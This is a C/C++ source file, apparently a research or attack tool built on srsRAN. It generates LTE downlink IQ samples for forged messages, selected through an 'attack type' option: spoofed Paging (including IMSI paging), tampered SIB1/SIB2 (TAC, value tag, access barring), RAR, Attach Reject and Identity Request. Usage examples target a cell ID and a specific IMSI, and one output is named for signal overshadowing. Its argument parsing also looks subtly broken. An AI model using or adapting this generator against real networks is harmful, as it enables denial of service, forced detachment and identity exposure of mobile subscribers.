#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "gen_sample.h"

#define SRSRAN_SIRNTI 0xFFFF
#define SRSRAN_PRNTI 0xFFFE
#define SRSRAN_MRNTI 0xFFFD
#define SRSRAN_CRNTI 0x47
/*
static srsran_cell_t cell = {
  100,               // nof_prb
  1,                 // nof_ports
  1,               // cell_id
  SRSRAN_CP_NORM,    // cyclic prefix
  SRSRAN_PHICH_NORM, // PHICH length
  SRSRAN_PHICH_R_1_6,  // PHICH resources
  SRSRAN_FDD,
};
*/
static srsran_cell_t cell = {
  100,               // nof_prb
  2,                 // nof_ports
  420,               // cell_id
  SRSRAN_CP_NORM,    // cyclic prefix
  SRSRAN_PHICH_NORM, // PHICH length
  SRSRAN_PHICH_R_1,  // PHICH resources
  SRSRAN_FDD,
};
static srsran_tm_t tm = SRSRAN_TM1;
//static srsran_tm_t tm = SRSRAN_TM2;

static bool enable_256qam = false;
static uint16_t rnti = SRSRAN_PRNTI;
static uint32_t cfi = 3;
static uint32_t tti = -1;
static uint32_t attack_type = 0;
//attack_type 表示攻击类型

const char *outputfile = "output";

static FILE *fp = NULL;
static cf_t zero_buff[10240] = {0,};

static uint8_t imsi_buff[100] = {0,};
//static std::string imsi  = "460012351624419";
static std::string imsi  = "000000000000000";
static uint sys_info_value_tag = 5;
static int tac = 10;

static srsran_enb_dl_t* enb_dl = NULL;
static srsran_softbuffer_tx_t* softbuffer_tx[SRSRAN_MAX_TB] = {};
static uint8_t* payload[SRSRAN_MAX_TB] = {};
static uint32_t payload_len = 0;
static cf_t* signal_buffer[SRSRAN_MAX_PORTS] = {NULL};
//static srsran_dl_sf_cfg_t sf_cfg_dl = {0,};
static srsran_dl_sf_cfg_t sf_cfg_dl = {{0}};
uint32_t preamble =  6;

static void usage(char *prog) {
  printf("\t-c cell id [Default %d]\n", cell.id);
  printf("\t-f cfi [Default %d]\n", cfi);
  printf("\t-p cell.nof_prb [Default %d]\n", cell.nof_prb);
  printf("\t-s tti [Default %d]\n", tti);
  printf("\t-r rnti [Default 0x%x]\n", rnti);
  printf("\t-o output file [Default %s]\n", outputfile);
  printf("\t-m IMSI [Default %s]\n", imsi.c_str());
  printf("\t-i preamble [Default %d]\n", preamble);

  printf("\t-t attack type [Default %d]\n", attack_type);
        // 添加新的信息
  printf("\tattack type options:\n");
  printf("\t %d - Paging Systeminfomodification\n", 0);
  printf("\t %d - Paging IMSI\n", 1);
  printf("\t %d - SIB1 Systeminfovaluetag\n", 2);
  printf("\t %d - SIB1 TAC\n", 3);
  printf("\t %d - SIB2 ACBarring\n", 4);
  printf("\t %d - RAR\n", 5);
  printf("\t %d - SIB1 Original\n", 6);
  printf("\t %d - Attach Reject\n", 7);
//例子
  printf("\nExample:\n");

  printf("\tPaging Systeminfomodification: \n\t ./lib/test/common/gen_sample -v -t 0 -r 0xfffe -s 9 -o output_paging_sysinfmod -p 100 -c 420\n");
  printf("\tPaging IMSI: \n\t ./lib/test/common/gen_sample -v -t 1 -r 0xfffe -s 9 -o output_paging_imsi -p 100 -c 420 -m 460017837217696\n");
  printf("\tSIB1 Systeminfovaluetag: \n\t ./lib/test/common/gen_sample -v -t 2 -r 0xffff -s 5 -o output_sib1_sysinfovaltag -p 100 -c 420\n");
  printf("\tSIB1 TAC: \n\t ./lib/test/common/gen_sample -v -t 3 -r 0xffff -s 5 -o output_sib1_tac -p 100 -c 420\n");
  printf("\tSIB2 ACBarring: \n\t ./lib/test/common/gen_sample -v -t 4 -r 0xffff -s 0 -o output_sib2_acbarring -p 100 -c 420\n");
  printf("\tRAR \n\t ./lib/test/common/gen_sample -v -t 5 -r 0x2 -s 5 -o output_rar -p 100 -c 420 -i 63\n");
  printf("\tSIB1 Original: \n\t ./lib/test/common/gen_sample -v -t 6 -r 0xffff -s 5 -o output_sib1_ori -p 100 -c 420\n");
  printf("\tAttach Reject: \n\t ./lib/test/common/gen_sample -v -t 7 -r 0x46 -s 5 -o output_attach_reject -p 100 -c 420\n");


}

static void parse_args(int argc, char **argv) {
  int opt;

  while ((opt = getopt(argc, argv, "hrfspcivmto")) != -1) {
    switch (opt) {
      case 't':
        attack_type = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      case 'h':
        usage(argv[0]);
        exit(-1);
      case 'r':
        rnti = (uint16_t)strtol(argv[optind], NULL, 16);
        break;
      case 'f':
        cfi = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      case 's':
        tti = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      case 'p':
        cell.nof_prb = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      case 'c':
        cell.id = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      case 'o':
        outputfile = argv[optind];
        break;
      case 'v':
        increase_srsran_verbose_level();
        break;
      case 'm':
        imsi = std::string(argv[optind]);
        //printf("%s", imsi.c_str());
        break;
      case 'i':
        preamble = (uint32_t)strtol(argv[optind], NULL, 10);
        break;
      default:
        usage(argv[0]);
        exit(-1);
    }
  }
}

static int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint32_t rv, uint16_t rnti, srsran_dci_dl_t* dci) {
  /* Calculate I_tbs for this TBS */
  uint32_t l_crb = 0;
  uint32_t rb_start = 0;
  int tbs = tbs_bytes * 8;
  int i;
  int mcs = -1;
  for (i = 0; i < 27; i++) {
      if (srsran_ra_tbs_from_idx(i, 2) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_2;
      l_crb                    = 2;
      mcs                      = i;
      tbs                      = srsran_ra_tbs_from_idx(i, 2);
      break;
      } else if (srsran_ra_tbs_from_idx(i, 3) >= tbs) {
      dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_3;
      l_crb                    = 3;
      mcs                      = i;
      tbs                      = srsran_ra_tbs_from_idx(i, 3);
      break;
      }
  }
  if (i == 28) {
      ERROR("Can't allocate Format 1A for TBS=%d\n", tbs);
      return -1;
  }
  if (l_crb == 0) {
      ERROR("L_crb is 0\n");
      return -1;
  }

  INFO("ra_tbs=%d/%d, tbs_bytes=%d, tbs=%d, mcs=%d",
          srsran_ra_tbs_from_idx(mcs, 2),
          srsran_ra_tbs_from_idx(mcs, 3),
          tbs_bytes,
          tbs,
          mcs);

  dci->alloc_type       = SRSRAN_RA_ALLOC_TYPE2;
  dci->type2_alloc.mode = srsran_ra_type2_t::SRSRAN_RA_TYPE2_LOC;
  dci->type2_alloc.riv  = srsran_ra_type2_to_riv(l_crb, rb_start, cell_nof_prb);
  dci->pid              = 0;
  dci->tb[0].mcs_idx    = mcs;
  dci->tb[0].rv         = rv;
  dci->format           = SRSRAN_DCI_FORMAT1A;
  dci->rnti             = rnti;

  return tbs;
}

int main(int argc, char** argv) {
  parse_args(argc,argv);
  srsran_use_standard_symbol_size(true); 
  logging::init_log_to_file("../log/output.log");
  MY_LOG() << "【test yg】start";

  // init, after acquire cell info.
  enb_dl = (srsran_enb_dl_t* )srsran_vec_malloc(sizeof(srsran_enb_dl_t));
  if (!enb_dl) {
      ERROR("Error allocating buffer\n");
      return -1;
  }
  /*
    * Allocate Memory
    */
  for (uint32_t i = 0; i < cell.nof_ports; i++) {
      signal_buffer[i] = (cf_t *)srsran_vec_malloc(sizeof(cf_t) * SRSRAN_SF_LEN_MAX);
      if (!signal_buffer[i]) {
      ERROR("Error allocating buffer");
      return -1;
      }
  }

  for (int i = 0; i < SRSRAN_MAX_TB; i++) {
      softbuffer_tx[i] = (srsran_softbuffer_tx_t*)calloc(sizeof(srsran_softbuffer_tx_t), 1);
      if (!softbuffer_tx[i]) {
      ERROR("Error allocating softbuffer_tx");
      return -1;
      }

      //if (srsran_softbuffer_tx_init(softbuffer_tx[i], SRSRAN_MAX_PRB)) {
      if (srsran_softbuffer_tx_init(softbuffer_tx[i], cell.nof_prb)) {

      ERROR("Error initiating softbuffer_tx");
      return -1;
      }

      payload[i] = (uint8_t *)srsran_vec_malloc(sizeof(uint8_t) * 2048);
      if (!payload[i]) {
      ERROR("Error allocating data tx");
      return -1;
      }
      memset(payload[i], 0, sizeof(uint8_t) * 2048);
  }

  /*
   * Initialise eNb
   */
  //if (srsran_enb_dl_init(enb_dl, signal_buffer, SRSRAN_MAX_PRB)) {
  if (srsran_enb_dl_init(enb_dl, signal_buffer, cell.nof_prb)) {

      ERROR("Error initiating eNb downlink");
      return -1;
  }

  if (srsran_enb_dl_set_cell(enb_dl, cell)) {
      ERROR("Error setting eNb DL cell");
      return -1;
  }
  if (attack_type == 0){
    //Paging sysinfomod
    //tti = 9;
    //rnti = SRSRAN_PRNTI;
    printf("\n Start to generate Paging Systeminfomodification msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_paging_sysinfmod(payload[0], sizeof(uint8_t) * 2048, &payload_len);
  } else if (attack_type == 1) {
    //Paging IMSI
    //tti = 9;
    //rnti = SRSRAN_PRNTI;
    uint8_t imsi_buff[100] = {0,};
    uint32_t imsi_len = imsi_to_array(imsi, imsi_buff);
    printf("IMSI is %s. Handling specific case.",imsi.c_str());
    printf("\n Start to generate Paging IMSI msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_paging_imsi(payload[0], sizeof(uint8_t) * 2048, &payload_len, imsi_buff, imsi_len);

  } else if (attack_type == 2) {
    //tti = 5;
    //rnti = SRSRAN_SIRNTI;
    printf("\n Start to generate SIB1 Systeminfovaluetag msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_sib1_sysinfvaltag(payload[0], sizeof(uint8_t) * 2048, &payload_len, sys_info_value_tag);
  } else if (attack_type == 3) {
    //tti = 5;
    //rnti = SRSRAN_SIRNTI;
    printf("\n Start to generate SIB1 TAC msg to subframe %d with rnti = 0x%x tac = %d .\n", tti, rnti, tac);
    gen_sib1_tac(payload[0], sizeof(uint8_t) * 2048, &payload_len, tac);
  } else if (attack_type == 4) {
    //tti = 0;
    //rnti = SRSRAN_SIRNTI;
    printf("\n Start to generate SIB2 ACBarring msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_sib2_acbarring(payload[0], sizeof(uint8_t) * 2048, &payload_len);
  } else if (attack_type == 5) {
    printf("\n Start to generate RAR msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_rar_pdu(preamble, payload[0], sizeof(uint8_t) * 2048, &payload_len);
  } else if (attack_type == 6) {
    printf("\n Start to generate SIB1 original msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_sib1_original(payload[0], sizeof(uint8_t) * 2048, &payload_len);
  } else if (attack_type == 7) {
    printf("\n Start to generate Attach Reject msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    MY_LOG() << "test yg gen msg start";

    gen_attach_reject(payload[0], sizeof(uint8_t) * 2048, &payload_len);
    MY_LOG() << "test yg gen msg end";

  } else if (attack_type == 8) {
    printf("\n Start to generate Identity Request msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
    gen_identity_request(payload[0], sizeof(uint8_t) * 2048, &payload_len);
  }
  fp = fopen(outputfile, "wb");

  // sf_cfg_dl
  sf_cfg_dl.tti = tti;
  sf_cfg_dl.cfi = cfi;
  sf_cfg_dl.sf_type = SRSRAN_SF_NORM;

  // generate dci
  srsran_dci_location_t dci_locations[SRSRAN_MAX_CANDIDATES];
  uint32_t num_locations;
  num_locations = srsran_pdcch_common_locations(&enb_dl->pdcch, dci_locations, SRSRAN_MAX_CANDIDATES, cfi);

  srsran_dci_dl_t dci = {0,};
  srsran_dci_cfg_t dci_cfg = {0,};

  dci.location = dci_locations[0];
  //test yg 0730 add pdcch order
  //dci.is_pdcch_order = true;
  //dci.preamble_idx   = 6;
  //dci.prach_mask_idx = 1;
  MY_LOG() << "【test yg】1";

  generate_format1a_broadcast(payload_len, cell.nof_prb, 0, rnti, &dci);

  // encode
  srsran_enb_dl_put_base(enb_dl, &sf_cfg_dl); // sync失败，无法同步
  //srsran_enb_dl_put_base_wo_sync(enb_dl, &sf_cfg_dl);
  if (srsran_enb_dl_put_pdcch_dl(enb_dl, &dci_cfg, &dci)) {
      ERROR("Error putting PDCCH sf_idx=%d", sf_cfg_dl.tti);
      return -1;
  }

  srsran_pdsch_cfg_t pdsch_cfg;
  if (srsran_ra_dl_dci_to_grant(&cell, &sf_cfg_dl, tm, enable_256qam, &dci, &pdsch_cfg.grant)) {
      ERROR("Computing DL grant sf_idx=%d", sf_cfg_dl.tti);
      return -1;
  }

  char str[512];
  srsran_dci_dl_info(&dci, str, 512);
  INFO("eNb PDCCH: rnti=0x%x, %s", rnti, str);
  
  for (uint32_t i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
      pdsch_cfg.softbuffers.tx[i] = softbuffer_tx[i];
  }

  // Enable power allocation
  pdsch_cfg.power_scale  = true;
  pdsch_cfg.p_a          = 0.0f;                      // 0 dB
  pdsch_cfg.p_b          = (tm > SRSRAN_TM1) ? 1 : 0; // 0 dB
  pdsch_cfg.rnti         = rnti;
  pdsch_cfg.meas_time_en = false;

  if (srsran_enb_dl_put_pdsch(enb_dl, &pdsch_cfg, payload) < 0) {
     // ERROR("Error putting PDSCH sf_idx=%d", sf_cfg_dl.tti);
  }
  srsran_pdsch_tx_info(&pdsch_cfg, str, 512);
  INFO("eNb PDSCH: rnti=0x%x, %s", rnti, str);

  srsran_enb_dl_gen_signal(enb_dl);
  MY_LOG() << "【test yg】2";

  // signal_buffer write to file
  uint32_t zero_padding_len = SRSRAN_SF_LEN_PRB(cell.nof_prb)/10;
  printf("zero_padding_len:%d\n", zero_padding_len);
  printf("signal_buffer_len:%d\n", SRSRAN_SF_LEN_PRB(cell.nof_prb)+zero_padding_len*2);

   
//原本可行的写入文件:填充的0分别写入

  fwrite(zero_buff, zero_padding_len * sizeof(cf_t), 1, fp);
  fwrite(signal_buffer[0], SRSRAN_SF_LEN_PRB(cell.nof_prb) * sizeof(cf_t), 1, fp);
  fwrite(zero_buff, zero_padding_len * sizeof(cf_t), 1, fp); 
  fclose(fp);

  fp = fopen("output_rar_sf5_sigover_raw", "wb");
  printf("save length:%d\n", SRSRAN_SF_LEN_PRB(cell.nof_prb));

  fwrite(signal_buffer[0], SRSRAN_SF_LEN_PRB(cell.nof_prb) * sizeof(cf_t), 1, fp);
  fclose(fp);
  
  /*
//测试的写入文件:填充的0合入数组后写入
  cf_t* temp_buffer[SRSRAN_MAX_PORTS] = {NULL};
  for (uint32_t i = 0; i < SRSRAN_MAX_PORTS; i++) {
    temp_buffer[i] = srsran_vec_cf_malloc(SRSRAN_SF_LEN_MAX + zero_padding_len *2);
    if (!temp_buffer[i]) {
      perror("malloc");
      exit(-1);
    }
  }
  size_t signal_length = SRSRAN_SF_LEN_PRB(cell.nof_prb);
  memcpy(temp_buffer[0], zero_buff, zero_padding_len * sizeof(cf_t));
  memcpy(temp_buffer[0] + zero_padding_len, signal_buffer[0], signal_length * sizeof(cf_t));
  memcpy(temp_buffer[0] + zero_padding_len + signal_length, zero_buff, zero_padding_len * sizeof(cf_t));
  fwrite(temp_buffer[0], (SRSRAN_SF_LEN_MAX + zero_padding_len *2) * sizeof(cf_t), 1, fp);
  fclose(fp);
*/
  printf("OUTPUT: %s\n", outputfile);

  // free
  srsran_enb_dl_free(enb_dl);
  for (uint32_t i = 0; i < cell.nof_ports; i++) {
    if (signal_buffer[i]) {
      free(signal_buffer[i]);
    }
  }
  for (int i = 0; i < SRSRAN_MAX_TB; i++) {
    if (softbuffer_tx[i]) {
      srsran_softbuffer_tx_free(softbuffer_tx[i]);
      free(softbuffer_tx[i]);
    }

    if (payload[i]) {
      free(payload[i]);
    }
  }
  if (enb_dl) {
    free(enb_dl);
  }

  return 0;
}